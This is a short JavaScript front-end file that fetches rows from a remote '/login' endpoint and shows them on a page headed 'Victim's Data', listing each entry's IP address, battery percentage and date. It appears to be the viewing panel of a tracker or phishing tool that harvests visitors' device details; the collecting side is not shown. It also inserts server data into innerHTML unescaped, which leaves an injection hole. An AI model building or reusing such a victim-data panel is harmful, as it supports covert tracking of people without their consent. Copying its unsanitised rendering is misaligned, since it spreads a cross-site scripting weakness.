const container = document.querySelector(".container")
// const url = "http://localhost:3000";
const url = "https://login-b2mh.onrender.com";

const fetchData = async () => {

    try {
        const response = await fetch(`${url}/login`, {
            method: "GET",
        });

        const result = await response.json();

        let html = "";

        for (let i = 0; i < result.rows.length; i++) {
            const row = result.rows[i];

            html += `
                <ul> 
                    <h3>Victim's Data</h3>
                    <li>ip: ${row.ip}</li> 
                    <li>battery: ${row.battery_percentage}</li> 
                    <li>date: ${row.date}</li> 
                </ul>`;
        }

        container.innerHTML = html;


    } catch (error) {
        alert("failed to fetch", error)
    }

}

fetchData()


// const prev = container.innerHTML
// const template = `<ul>
//                 <li>ip: ${ip}</li>
//                 <li>battery: ${battery}</li>
//                 <li>date: ${date}</li>
//             </ul>`

